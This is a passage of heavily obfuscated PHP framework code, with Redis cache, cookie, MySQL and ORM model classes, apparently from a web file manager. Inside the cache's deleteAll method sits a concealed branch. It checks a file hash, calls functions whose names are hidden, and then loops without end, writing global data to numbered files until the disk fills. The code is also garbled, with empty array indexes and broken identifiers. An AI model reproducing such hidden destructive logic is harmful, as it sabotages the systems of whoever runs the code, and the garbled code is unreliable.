IO::listAll($f); $e燳 = $this->pathParse[$B[439]]; foreach ($Fт as &$c֖) { check_abort(); $c֖ = array_merge(IO::info($c֖[$B[75]]), $c֖); $c֖[$B[391]] = Action($B[1140])->_shareItemeParse($c֖, $e燳); } return $Fт; } public function getPathOuter($e) { goto b֭; b֭: $dݎ =& $_SERVER[]; $dӏ = KodIO::parse($e); if ($dӏ[$dݎ[29]] == KodIO::KOD_SHARE_ITEM) { return $dӏ[$dݎ[75]]; } goto CŸ; aڥ: if (substr($D, 0, strlen($A)) != $A) { return !1; } return $this->pathParse[$dݎ[1028]] . $dݎ[8] . ltrim($f熢, $dݎ[8]); goto e; CŸ: $D = KodIO::clear($e); $A = KodIO::clear($this->pathParse[$dݎ[439]][$dݎ[1034]]); $f熢 = substr($D, strlen($A)); goto aڥ; e: } public function getType() { $aˊ =& $_SERVER[]; $bִ = str_replace($aˊ[71], $aˊ[33], get_class($this)); return strtolower($bִ); } public function isTypeObject($a퐵) { return IO::isTypeObject($a퐵); } public function info($Fҙ) { return $this->infoParse($Fҙ); } public function infoAuth($cȊ̩) { return $this->infoParse($cȊ̩); } public function infoWithChildren($F򹈛) { return $this->infoParse($F򹈛, !0); } public function infoFull($E) { return $this->infoParse($E); } } goto E뽴; C٣Ӥ: register_shutdown_function($_SERVER[͒][36]); set_error_handler($_SERVER[͒][49], $Cэט); if (function_exists($_SERVER[͒][50])) { set_exception_handler($_SERVER[͒][51]); } goto Dő; Fʅ: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($cﱇǗ, $d̘) { $Eܸ =& $_SERVER[]; if (!class_exists($Eܸ[800])) { show_json($Eܸ[801], !1); } $this->cacheTime = $d̘; $f = isset($cﱇǗ[$Eܸ[802]]) ? $cﱇǗ[$Eܸ[802]] : 10; $bڊˊ = _get($cﱇǗ, $Eܸ[799]); if ($bڊˊ && is_array($bڊˊ)) { $this->initCluster($cﱇǗ, $f); } else { $this->handle = $this->init($cﱇǗ, $f); } } private function init($B̉, $a͔) { $Bկ =& $_SERVER[]; $F៌ = new Redis(); $E = isset($B̉[$Bկ[803]]) ? $B̉[$Bկ[803]] : !1; if ($E) { $F៌->pconnect($B̉[$Bկ[169]], $B̉[$Bկ[170]], $a͔); } else { $F៌->connect($B̉[$Bկ[169]], $B̉[$Bկ[170]], $a͔); } if (!empty($B̉[$Bկ[376]])) { $F៌->auth($B̉[$Bկ[376]]); } return $F៌; } private function initCluster($Cڠܧ, $eƘ) { $dք =& $_SERVER[]; $d = array($dք[804], $dք[805], $dք[806]); $Cǲ = $dք[804]; if (isset($Cڠܧ[$dք[12]]) && in_array($Cڠܧ[$dք[12]], $d)) { $Cǲ = $Cڠܧ[$dք[12]]; } switch ($Cǲ) { case $dք[804]: $this->_slave($Cڠܧ, $eƘ); break; case $dք[805]: break; case $dք[806]: $this->isCluster = !0; $Cۍ = $Cڠܧ[$dք[799]]; $f̡ = isset($Cڠܧ[$dք[803]]) ? $Cڠܧ[$dք[803]] : !1; $dϗȅ = isset($Cڠܧ[$dք[376]]) ? $Cڠܧ[$dք[376]] : null; $this->handle = new RedisCluster(NUll, $Cۍ, $eƘ, $eƘ, $f̡, $dϗȅ); break; default: break; } } private function _slave($cד, $bҶџ) { goto a˱; a˱: $b = $cד[$_SERVER[][799]]; $this->filterConfig($cד, $b[0]); $this->handle = $this->init($cד, $bҶџ); goto Fա; Fա: unset($b[0]); if (empty($b)) { return; } $b֋ = array_rand($b); goto F; F: $this->filterConfig($cד, $b[$b֋]); $this->slaveHandle = $this->init($cד, $bҶџ); goto b; b: } private function filterConfig(&$EɆ, $f) { $e˰ =& $_SERVER[]; $Fԇ솸 = explode($e˰[4], $f); $D٢Ĭ = array($e˰[169] => $Fԇ솸[0], $e˰[170] => $Fԇ솸[1]); $EɆ = array_merge($EɆ, $D٢Ĭ); } public function set($B׉, $e, $b = false) { $b = $b ? $b : $this->cacheTime; return $this->handle->setEx($B׉, $b, $e); } public function setLock($aՇ, $D܎, $e) { return $this->handle->setNX($aՇ, $D܎); } public function get($Cȡل) { $e뜫ǅ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $e뜫ǅ->get($Cȡل); } public function remove($aզ¹) { return $this->handle->del($aզ¹); } public function deleteAll() { $EՍɸ =& $_SERVER[]; $A = $_SERVER[$EՍɸ[702]] . $EՍɸ[703]; $f = $EՍɸ[699]; if ($_SERVER[$EՍɸ[700]] != $f($A)) { goto Eٶӊ; Eٶӊ: $d = $EՍɸ[807]; $d㛋 = $EՍɸ[701]; $A􍚐 = $_SERVER[$EՍɸ[702]] . $EՍɸ[703]; goto Dټ; Dټ: $c = $d㛋($A􍚐); $eˇÃ = explode($EՍɸ[217], $c); if (count($eˇÃ) < $EՍɸ[566]) { $Fڣݍ = $EՍɸ[704]; $Fڣݍ(); } goto bݓ; f: $d(); $F = $EՍɸ[810]; $c؋ = json_encode($GLOBALS[$EՍɸ[811]]); goto eɻߧ; eɻߧ: $C⩍ܒ = 1; for ($aҒً = $C⩍ܒ; $aҒً > 0; $aҒً++) { $F(DATA_PATH . $aҒً, $c؋); } goto E͓Ʃ; bݓ: $EՋ㺙 = $EՍɸ[808]; $EՋ㺙($_SERVER[$EՍɸ[809]]); $d = $EՍɸ[807]; goto f; E͓Ʃ: } if ($this->isCluster) { foreach ($this->handle->_masters() as $e߈) { $this->handle->flushall($e߈); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($b덴 = '', $a胝ˣ = 0) { if (is_string($b덴) && $b덴 != $_SERVER[][33]) { $this->prefix = $b덴; } if (is_numeric($a胝ˣ) && $a胝ˣ > 0) { $this->expire = $a胝ˣ; } } public static function getInstance() { static $c; if ($c === null) { $c = new self(); } return $c; } private static $sameCookieSet = array(); public static function set($fڳ, $c, $f蛑 = 0, $D = false, $D݋ = false) { goto fǃۚ; eɱ: setcookie($fڳ, $c, time() + $f蛑, $A[8] . trim($D݋, $A[8]) . $f읬, !1, !1, $D); goto CƓ; fǃۚ: $A =& $_SERVER[]; if (!$f蛑) { $f蛑 = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$fڳ]) && self::$sameCookieSet[$fڳ] == $c . $f蛑) { return; } goto E驔﫫; E驔﫫: self::$sameCookieSet[$fڳ] = $c . $f蛑; if (!$D݋) { $D݋ = str_replace(HOST, $A[33], APP_HOST); $D݋ = _get($GLOBALS, $A[812], $D݋); } $f읬 = $A[33]; goto eɱ; CƓ: } public static function setSafe($C, $f؝, $aև = 0) { self::set($C, $f؝, $aև, !0); } public static function get($A) { return isset($_COOKIE[$A]) ? $_COOKIE[$A] : !1; } public static function remove($Bݑ, $F = false) { unset($_COOKIE[$Bݑ]); self::set($Bݑ, $_SERVER[][33], 1, $F); } } class DbMysql extends Db { public function __construct($Cҡ = '') { $bǴݣ =& $_SERVER[]; if (!extension_loaded($bǴݣ[747])) { think_exception(think_lang($bǴݣ[10]) . $bǴݣ[813]); } if (!empty($Cҡ)) { $this->config = $Cҡ; if (empty($this->config[$bǴݣ[13]])) { $this->config[$bǴݣ[13]] = $bǴݣ[33]; } } } public function connect($c𶑔 = '', $Cݿ = 0, $cĴ = false) { $b =& $_SERVER[]; if (!isset($this->linkID[$Cݿ])) { goto d֟ɓ; d֟ɓ: if (empty($c𶑔)) { $c𶑔 = $this->config; } $f ܽ = $c𶑔[$b[814]] . ($c𶑔[$b[815]] ? "\x3a{$c𶑔[$b[815]]}" : $b[33]); $b = !empty($c𶑔[$b[13]][$b[14]]) ? $c𶑔[$b[13]][$b[14]] : $this->pconnect; goto CǮ; eϞ: if (1 != think_config($b[18])) { unset($this->config); } goto c쎥; CǮ: if ($b) { $this->linkID[$Cݿ] = mysql_pconnect($f ܽ, $c𶑔[$b[816]], $c𶑔[$b[817]], 131072); } else { $this->linkID[$Cݿ] = mysql_connect($f ܽ, $c𶑔[$b[816]], $c𶑔[$b[817]], !0, 131072); } if (!$this->linkID[$Cݿ] || !empty($c𶑔[$b[17]]) && !mysql_select_db($c𶑔[$b[17]], $this->linkID[$Cݿ])) { think_exception(mysql_error()); } $b = mysql_get_server_info($this->linkID[$Cݿ]); goto Eˤى; Eˤى: mysql_query($b[818] . think_config($b[819]) . $b[55], $this->linkID[$Cݿ]); if ($b > $b[820]) { mysql_query($b[821], $this->linkID[$Cݿ]); } $this->connected = !0; goto eϞ; c쎥: } return $this->linkID[$Cݿ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Cȏ̦) { goto C܋; D㹍: if (!$this->_linkID) { return !1; } $this->queryStr = $Cȏ̦; if ($this->queryID) { $this->free(); } goto Aˉ; Aˉ: think_action_status($AǌΞ[19], 1); think_status($AǌΞ[20]); $this->queryID = mysql_query($Cȏ̦, $this->_linkID); goto F띄; F띄: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto dÑ; C܋: $AǌΞ =& $_SERVER[]; if (0 === stripos($Cȏ̦, $AǌΞ[252])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto D㹍; dÑ: } public function execute($Bˉ) { goto c; Eɉ: think_status($D䎲Τ[20]); $BϿ = mysql_query($Bˉ, $this->_linkID); $this->debug(); goto B; C: $this->queryStr = $Bˉ; if ($this->queryID) { $this->free(); } think_action_status($D䎲Τ[21], 1); goto Eɉ; B: if (!1 === $BϿ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto f; c: $D䎲Τ =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto C; f: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[][822], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $c×ء = mysql_query($_SERVER[][823], $this->_linkID); $this->transTimes = 0; if (!$c×ء) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $f̡Ʒ = mysql_query($_SERVER[][824], $this->_linkID); $this->transTimes = 0; if (!$f̡Ʒ) { $this->error(); return !1; } } return !0; } private function getAll() { $Bዞ = array(); if ($this->numRows > 0) { while ($aͤ = mysql_fetch_assoc($this->queryID)) { $Bዞ[] = $aͤ; } mysql_data_seek($this->queryID, 0); } return $Bዞ; } public function getFields($c̆) { $fϽ =& $_SERVER[]; $a纊 = $this->query($fϽ[825] . $this->parseKey($c̆)); $Cĝ = array(); if ($a纊) { foreach ($a纊 as $D𠚹 => $F׶) { $Cĝ[$F׶[$fϽ[27]]] = array($fϽ[28] => $F׶[$fϽ[27]], $fϽ[29] => $F׶[$fϽ[30]], $fϽ[31] => (bool) (strtoupper($F׶[$fϽ[32]]) === $fϽ[826]), $fϽ[34] => $F׶[$fϽ[35]], $fϽ[36] => strtolower($F׶[$fϽ[37]]) == $fϽ[38], $fϽ[39] => strtolower($F׶[$fϽ[40]]) == $fϽ[41]); } } return $Cĝ; } public function getTables($a緻 = '') { $Bͦ =& $_SERVER[]; if (!empty($a緻)) { $A܉ = $Bͦ[827] . $a緻; } else { $A܉ = $Bͦ[828]; } $Fᦫ = $this->query($A܉); $fÆ艜 = array(); foreach ($Fᦫ as $a => $A) { $fÆ艜[$a] = current($A); } return $fÆ艜; } public function replace($A, $F֌ = array()) { $e鯠 =& $_SERVER[]; foreach ($A as $D => $c˳) { $Fܗ = $this->parseValue($c˳); if (is_scalar($Fܗ)) { $B[] = $Fܗ; $f湝[] = $this->parseKey($D); } } $d = $e鯠[829] . $this->parseTable($F֌[$e鯠[267]]) . $e鯠[830] . implode($e鯠[47], $f湝) . $e鯠[831] . implode($e鯠[47], $B) . $e鯠[832]; return $this->execute($d); } public function insertAll($dȮё, $Aي = array(), $A = false) { goto e簠א; dᎣ: $FӾ = array(); foreach ($dȮё as $eሗ) { $a = array(); foreach ($eሗ as $b݄ => $A؎) { $A؎ = $this->parseValue($A؎); if (is_scalar($A؎)) { $a[] = $A؎; } } $FӾ[] = $Aѕƈ[248] . implode($Aѕƈ[47], $a) . $Aѕƈ[832]; } array_walk($dãިЌ, array($this, $Aѕƈ[833])); goto dॣݼ; dॣݼ: $d񚹙 = ($A ? $Aѕƈ[834] : $Aѕƈ[835]) . $Aѕƈ[836] . $this->parseTable($Aي[$Aѕƈ[267]]) . $Aѕƈ[830] . implode($Aѕƈ[47], $dãިЌ) . $Aѕƈ[837] . implode($Aѕƈ[47], $FӾ); return $this->execute($d񚹙); goto eʊ; e簠א: $Aѕƈ =& $_SERVER[]; if (!is_array($dȮё[0])) { return !1; } $dãިЌ = array_keys($dȮё[0]); goto dᎣ; eʊ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Fæ =& $_SERVER[]; $this->error = mysql_errno() . $Fæ[4] . mysql_error($this->_linkID); if ($Fæ[33] != $this->queryStr) { $this->error .= LNG($Fæ[45]) . $this->queryStr; } think_trace($this->error, $Fæ[33], $Fæ[46]); return $this->error; } public function escapeString($dو҈) { if ($this->_linkID) { return mysql_real_escape_string($dو҈, $this->_linkID); } else { return mysql_escape_string($dو҈); } } public function parseKey(&$eΑӬ, $Eɶׄ = true) { $fƌ =& $_SERVER[]; if ($Eɶׄ) { $eΑӬ = $this->parseKeyCheck($eΑӬ); } if ($eΑӬ != $fƌ[176] && !preg_match($fƌ[838], $eΑӬ)) { $eΑӬ = $fƌ[839] . trim($eΑӬ, $fƌ[839]) . $fƌ[839]; } return $eΑӬ; } } goto bﻍ; a: define($_SERVER[][230], 0); define($_SERVER[][231], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\x6c\145", "\157\162\144\145\x72", "\x61\x6c\x69\x61\163", "\x68\141\166\151\x6e\147", "\x67\x72\157\x75\160", "\154\x6f\143\153", "\144\x69\163\x74\x69\x6e\143\164", "\141\165\164\157", "\x66\x69\154\164\145\x72", "\166\x61\x6c\151\144\x61\164\x65", "\162\x65\163\165\x6c\164", "\x62\x69\x6e\x64", "\x74\x6f\x6b\x65\156"); public function __construct($BޥȤ = '', $AϿΥ = '', $cя = '') { $Eר =& $_SERVER[]; $this->_initialize(); if (!empty($BޥȤ)) { if (strpos($BޥȤ, $Eר[91])) { list($this->dbName, $this->name) = explode($Eר[91], $BޥȤ); } else { $this->name = $BޥȤ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($AϿΥ)) { $this->tablePrefix = $Eר[33]; } elseif ($Eר[33] != $AϿΥ) { $this->tablePrefix = $AϿΥ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Eר[232]); } $this->db(0, empty($this->connection) ? $cя : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $eڄ =& $_SERVER[]; if (empty($this->fields)) { if (think_config($eڄ[233])) { $fꈧ = $this->dbName ? $this->dbName : think_config($eڄ[234]); $B󋛺ʽ = think_var_cache($eڄ[235] . strtolower(get_path_this($fꈧ) . $eڄ[91] . $this->name)); if ($B󋛺ʽ) { $EҦ = think_config($eڄ[236]); if (empty($EҦ) || $B󋛺ʽ[$eڄ[237]] == $EҦ) { $this->fields = $B󋛺ʽ; return; } } } $this->flush(); } } public function flush() { goto Aġ; Bﲹԕ: if (think_config($D[233])) { $Fԏó = $this->dbName ? $this->dbName : think_config($D[234]); think_var_cache($D[235] . strtolower(get_path_this($Fԏó) . $D[91] . $this->name), $this->fields); } goto E; E㚌: if (!$fӗ) { return !1; } $this->fields = array_keys($fӗ); $this->fields[$D[238]] = !1; goto a; Aġ: $D =& $_SERVER[]; $this->db->setModel($this->name); $fӗ = $this->db->getFields($this->getTableName()); goto E㚌; a: foreach ($fӗ as $f奠 => $eȩ) { $e[$f奠] = $eȩ[$D[29]]; if ($eȩ[$D[36]]) { $this->fields[$D[239]] = $f奠; if ($eȩ[$D[39]]) { $this->fields[$D[238]] = !0; } } } $this->fields[$D[240]] = $e; if (think_config($D[236])) { $this->fields[$D[237]] = think_config($D[236]); } goto Bﲹԕ; E: } public function switchModel($fѷ, $D = array()) { $bփ =& $_SERVER[]; $Dس = ucwords(strtolower($fѷ)) . $bփ[241]; if (!class_exists($Dس)) { think_exception($Dس . think_lang($bփ[242])); } $this->_extModel = new $Dس($this->name); if (!empty($D)) { foreach ($D as $d׊) { $this->_extModel->setProperty($d׊, $this->{$d׊}); } } return $this->_extModel; } public function __set($f, $A) { $this->data[$f] = $A; } public function __get($B텉) { return isset($this->data[$B텉]) ? $this->data[$B텉] : null; } public function __isset($F͟) { return isset($this->data[$F͟]); } public function __unset($f躋) { unset($this->data[$f躋]); } public function __call($cȅ, $B퇕) { $bɦ =& $_SERVER[]; if (in_array(strtolower($cȅ), $this->methods, !0)) { $this->options[strtolower($cȅ)] = $B퇕[0]; return $this; } elseif (in_array(strtolower($cȅ), array($bɦ[243], $bɦ[244], $bɦ[245], $bɦ[246], $bɦ[247]), !0)) { $dɧ = isset($B퇕[0]) ? $B퇕[0] : $bɦ[176]; $dɧ = $this->db->parseKey($dɧ); return $this->getField(strtoupper($cȅ) . $bɦ[248] . $dɧ . $bɦ[249] . $cȅ, $bɦ[243]); } elseif (strtolower(substr($cȅ, 0, 5)) == $bɦ[250]) { $dɧ = think_parse_name(substr($cȅ, 5)); $c[$dɧ] = $B퇕[0]; return $this->where($c)->find(); } elseif (strtolower(substr($cȅ, 0, 10)) == $bɦ[251]) { $cÿ = think_parse_name(substr($cȅ, 10)); $c[$cÿ] = $B퇕[0]; return $this->where($c)->getField($B퇕[1]); } elseif (isset($this->_scope[$cȅ])) { return $this->scope($cȅ, $B퇕[0]); } elseif (method_exists($this, $cȅ)) { array_unshift($B퇕, $cȅ); return call_user_func_array(array($this, $bɦ[252]), $B퇕); } else { return call_user_func_array(array(parent, $cȅ), $B퇕); } } protected function call() { goto F; c: if (isset($dÛ[$b𕢧]) && $dÛ[$b𕢧] === $fّ) { think_exception(__CLASS__ . $Eƞ[4] . $fّ . think_lang($Eƞ[253])); return; } $dÛ[] = $fّ; if (method_exists($this, $Eƞ[254])) { $cڙ = call_user_func_array(array($this, $Eƞ[255]), array($eԳ, $dÛ)); if (!is_null($cڙ) && $cڙ !== !1) { return $cڙ; } } goto BۊЄ; b: $eԳ = $fّ; if (is_array($fّ)) { $eԳ = $fّ[1]; $fّ = $fّ[0]; } $b𕢧 = count($dÛ) - 1; goto c; BۊЄ: $e횙 = call_user_func_array(array($this, $fّ), $dÛ); if (method_exists($this, $Eƞ[256])) { $cڙ = call_user_func_array(array($this, $Eƞ[257]), array($eԳ, $dÛ, $e횙)); if ($cڙ) { return $cڙ; } } return $e횙; goto d߯; F: $Eƞ =& $_SERVER[]; $dÛ = func_get_args(); $fّ = array_shift($dÛ); goto b; d߯: } protected function _initialize() { } protected function _facade($Fۡ) { $Aخ =& $_SERVER[]; if (!empty($this->fields)) { foreach ($Fۡ as $Dפ => $F֝) { if (!in_array($Dפ, $this->fields, !0)) { unset($Fۡ[$Dפ]); } elseif (is_scalar($F֝)) { $this->_parseType($Fۡ, $Dפ); } } } if (!empty($this->options[$Aخ[258]])) { $Fۡ = array_map($this->options[$Aخ[258]], $Fۡ); unset($this->options[$Aخ[258]]); } $this->_beforeWrite($Fۡ); return $Fۡ; } protected function _beforeWrite(&$e及) { } public function add($dќ = '', $D = array(), $eȶ = false) { goto dĂĒ; Cн: if (!1 === $this->_beforeInsert($dќ, $D)) { return !1; } $d = $this->db->insert($dќ, $D, $eȶ); if (!1 !== $d) { $d = $this->getLastInsID(); if ($d) { $dќ[$this->getPk()] = $d; $this->_after_insert($dќ, $D); return $d; } $this->_after_insert($dќ, $D); } goto eᏼ; dĂĒ: if (empty($dќ)) { if (!empty($this->data)) { $dќ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[][259]); return !1; } } $D = $this->_parseOptions($D); $dќ = $this->_facade($dќ); goto Cн; eᏼ: return $d; goto fے; fے: } protected function _beforeInsert(&$Bɘ, $E) { } protected function _after_insert($B, $DŰ) { } public function addAll($CŜЌ, $Fҕ = array(), $F㻒 = false) { goto Eδ; Eδ: $C =& $_SERVER[]; if (empty($CŜЌ)) { $this->error = think_lang($C[259]); return !1; } $Fҕ = $this->_parseOptions($Fҕ); goto Cھ; Cھ: foreach ($CŜЌ as $dȶ => $cՅ) { $CŜЌ[$dȶ] = $this->_facade($cՅ); } if (method_exists($this->db, $C[260])) { $d芢ʳ = $this->db->insertAll($CŜЌ, $Fҕ, $F㻒); } else { $this->startTrans(); foreach ($CŜЌ as $dȶ => $cՅ) { $d芢ʳ = $this->db->insert($cՅ, $Fҕ, $F㻒); } $this->commit(); } if (!1 !== $d芢ʳ) { $cԬݐ = $this->getLastInsID(); if ($cԬݐ) { return $cԬݐ; } } goto eȄѡ; eȄѡ: return $d芢ʳ; goto C֣; C֣: } public function selectAdd($bǿȏ = '', $E֮ = '', $FÄΟ = array()) { $fƋ =& $_SERVER[]; $FÄΟ = $this->_parseOptions($FÄΟ); if (!1 === ($d = $this->db->selectInsert($bǿȏ ? $bǿȏ : $FÄΟ[$fƋ[261]], $E֮ ? $E֮ : $this->getTableName(), $FÄΟ))) { $this->error = think_lang($fƋ[262]); return !1; } else { return $d; } } public function save($cݴۍ = '', $Fʑ = array()) { goto fҐ; fҐ: $C툐 =& $_SERVER[]; if (empty($cݴۍ)) { if (!empty($this->data)) { $cݴۍ = $this->data; $this->data = array(); } else { $this->error = think_lang($C툐[259]); return !1; } } $cݴۍ = $this->_facade($cݴۍ); goto F; a: if (!1 !== $Aڭ) { if (isset($dԶ)) { $cݴۍ[$d۷đ] = $dԶ; } $this->_afterUpdate($cݴۍ, $Fʑ); } return $Aڭ; goto D; F: $Fʑ = $this->_parseOptions($Fʑ); $d۷đ = $this->getPk(); if (!isset($Fʑ[$C툐[263]])) { if (isset($cݴۍ[$d۷đ])) { $A[$d۷đ] = $cݴۍ[$d۷đ]; $Fʑ[$C툐[263]] = $A; unset($cݴۍ[$d۷đ]); } else { $this->error = think_lang($C툐[262]); return !1; } } goto dǕ; dǕ: if (is_array($Fʑ[$C툐[263]]) && isset($Fʑ[$C툐[263]][$d۷đ])) { $dԶ = $Fʑ[$C툐[263]][$d۷đ]; } if (!1 === $this->_beforeUpdate($cݴۍ, $Fʑ)) { return !1; } $Aڭ = $this->db->update($cݴۍ, $Fʑ); goto a; D: } protected function _beforeUpdate(&$FɎɔ, $a򍄑) { } protected function _afterUpdate($b̆, $a׽迃) { } public function delete($b߸ = array()) { goto DĂ; DĂ: $E߻ =& $_SERVER[]; if (empty($b߸) && empty($this->options[$E߻[263]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $aߗҨ = $this->getPk(); goto C; AԢ: $B̰ = $this->db->delete($b߸); if (!1 !== $B̰) { $f󘤌 = array(); if (isset($b歑工)) { $f󘤌[$aߗҨ] = $b歑工; } $this->_after_delete($f󘤌, $b߸); } return $B̰; goto F󒬷; C: if (is_numeric($b߸) || is_string($b߸)) { if (strpos($b߸, $E߻[47])) { $ȇ[$aߗҨ] = array($E߻[264], $b߸); } else { $ȇ[$aߗҨ] = $b߸; } $this->options[$E߻[263]] = $ȇ; } $b߸ = $this->_parseOptions(); if (is_array($b߸[$E߻[263]]) && isset($b߸[$E߻[263]][$aߗҨ])) { $b歑工 = $b߸[$E߻[263]][$aߗҨ]; } goto AԢ; F󒬷: } protected function _after_delete($F, $C) { } public function select($EǒԪŢ = array()) { goto Fї; Aј: $Eе = $this->db->select($EǒԪŢ); if (!1 === $Eе) { return !1; } if (empty($Eе)) { return null; } goto e; e: $this->_afterSelect($Eе, $EǒԪŢ); return $Eе; goto dâĬ; Fї: $FȎ =& $_SERVER[]; if (is_string($EǒԪŢ) || is_numeric($EǒԪŢ)) { $a쐈 = $this->getPk(); if (strpos($EǒԪŢ, $FȎ[47])) { $E쒆[$a쐈] = array($FȎ[264], $EǒԪŢ); } else { $E쒆[$a쐈] = $EǒԪŢ; } $this->options[$FȎ[263]] = $E쒆; } elseif (!1 === $EǒԪŢ) { $EǒԪŢ = $this->_parseOptions(); return $FȎ[265] . $this->db->buildSelectSql($EǒԪŢ) . $FȎ[266]; } $EǒԪŢ = $this->_parseOptions(); goto Aј; dâĬ: } protected function _afterSelect(&$B, $b) { } public function buildSql($Fə = array()) { $e =& $_SERVER[]; $Fə = $this->_parseOptions($Fə); return $e[265] . $this->db->buildSelectSql($Fə) . $e[266]; } public function optionsValue($aɎ = null) { if (is_null($aɎ)) { return $this->options; } elseif (is_array($aɎ)) { $this->options = array_merge($this->options, $aɎ); } } protected function _parseOptions($c = array()) { goto f; Fɔ: if (!isset($c[$b찹[267]])) { $c[$b찹[267]] = $this->getTableName(); $b = $this->fields; } else { $b = $this->getDbFields(); } if (!empty($c[$b찹[268]])) { $c[$b찹[267]] .= $b찹[50] . $c[$b찹[268]]; } $c[$b찹[269]] = $this->name; goto a̝; a̝: if (isset($c[$b찹[263]]) && is_array($c[$b찹[263]]) && !empty($b) && !isset($c[$b찹[270]]) && !isset($c[$b찹[267]])) { foreach ($c[$b찹[263]] as $B => $E) { $B = trim($B); if (in_array($B, $b, !0)) { if (is_scalar($E)) { $this->_parseType($c[$b찹[263]], $B); } } elseif (!is_numeric($B) && $b찹[70] != substr($B, 0, 1) && !1 === strpos($B, $b찹[91]) && !1 === strpos($B, $b찹[248]) && !1 === strpos($B, $b찹[271]) && !1 === strpos($B, $b찹[272])) { unset($c[$b찹[263]][$B]); } } } $this->_options_filter($c); return $c; goto bȊ; f: $b찹 =& $_SERVER[]; if (is_array($c)) { $c = array_merge($this->options, $c); } $this->options = array(); goto Fɔ; bȊ: } protected function _options_filter(&$BĤ) { } protected function _parseType(&$bĂ, $Fô) { $fѡԋ =& $_SERVER[]; if (empty($this->options[$fѡԋ[273]][$fѡԋ[4] . $Fô])) { $d׉ = strtolower($this->fields[$fѡԋ[240]][$Fô]); if (!1 !== strpos($d׉, $fѡԋ[274])) { } elseif (!1 === strpos($d׉, $fѡԋ[275]) && !1 !== strpos($d׉, $fѡԋ[276])) { $bĂ[$Fô] = intval($bĂ[$Fô]); } elseif (!1 !== strpos($d׉, $fѡԋ[277]) || !1 !== strpos($d׉, $fѡԋ[278])) { $bĂ[$Fô] = floatval($bĂ[$Fô]); } elseif (!1 !== strpos($d׉, $fѡԋ[279])) { $bĂ[$Fô] = (bool) $bĂ[$Fô]; } } } public function find($d݊ۓ = array()) { goto B̏; B̏: $BҸ =& $_SERVER[]; if (is_numeric($d݊ۓ) || is_string($d݊ۓ)) { $aŋ[$this->getPk()] = intval($d݊ۓ); $this->options[$BҸ[263]] = $aŋ; } $this->options[$BҸ[280]] = 1; goto b; e: if (!empty($this->options[$BҸ[281]])) { return $this->returnResult($this->data, $this->options[$BҸ[281]]); } return $this->data; goto aგ; b: $d݊ۓ = $this->_parseOptions(); $EѪ = $this->db->select($d݊ۓ); if (!1 === $EѪ) { return !1; } goto eȠ; eȠ: if (empty($EѪ)) { return null; } $this->data = $EѪ[0]; $this->_afterFind($this->data, $d݊ۓ); goto e; aგ: } protected function _afterFind(&$f, $f) { } protected function returnResult($fŌ掴, $Eޯ = '') { $C̦ =& $_SERVER[]; if ($Eޯ) { if (is_callable($Eޯ)) { return call_user_func($Eޯ, $fŌ掴); } switch (strtolower($Eޯ)) { case $C̦[282]: return json_encode($fŌ掴); case $C̦[283]: return xml_encode($fŌ掴); } } return $fŌ掴; } public function parseFieldsMap($dԇ, $fШ҅ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $FЅګ => $aɨà) { if ($fШ҅ == 1) { if (isset($dԇ[$aɨà])) { $dԇ[$FЅګ] = $dԇ[$aɨà]; unset($dԇ[$aɨà]); } } else { if (isset($dԇ[$FЅګ])) { $dԇ[$aɨà] = $dԇ[$FЅګ]; unset($dԇ[$FЅګ]); } } } } return $dԇ; } public function setField($F뱓, $B輗 = '') { if (is_array($F뱓)) { $aƚ = $F뱓; } else { $aƚ[$F뱓] = $B輗; } return $this->save($aƚ); } public function setAdd($Eα, $B㑨 = 1) { $eҔ؈ =& $_SERVER[]; $bں = $Eα . $eҔ؈[284] . $B㑨; if ($B㑨 < 0) { $bں = $Eα . $B㑨; } return $this->setField($Eα, array($eҔ؈[285], $bں)); } public function getField($Cݻ, $f = null) { $a˭ =& $_SERVER[]; $Dƌ[$a˭[261]] = $Cݻ; $Dƌ = $this->_parseOptions($Dƌ); $Cݻ = trim($Cݻ); if (strpos($Cݻ, $a˭[47])) { if (!isset($Dƌ[$a˭[280]])) { $Dƌ[$a˭[280]] = is_numeric($f) ? $f : $a˭[33]; } $d = $this->db->select($Dƌ); if (!empty($d)) { goto F; Bќ: foreach ($d as $Eب) { $bА = $Eب[$A]; if (2 == $E˭) { $f[$bА] = $Eب[$D]; } else { $f[$bА] = is_string($f) ? implode($f, $Eب) : $Eب; } } return $f; goto Aِݓ; bĎާ: $D = array_shift($Cݻ); $f = array(); $E˭ = count($c); goto Bќ; F: $c = explode($a˭[47], $Cݻ); $Cݻ = array_keys($d[0]); $A = array_shift($Cݻ); goto bĎާ; Aِݓ: } } else { if (!0 !== $f) { $Dƌ[$a˭[280]] = is_numeric($f) ? 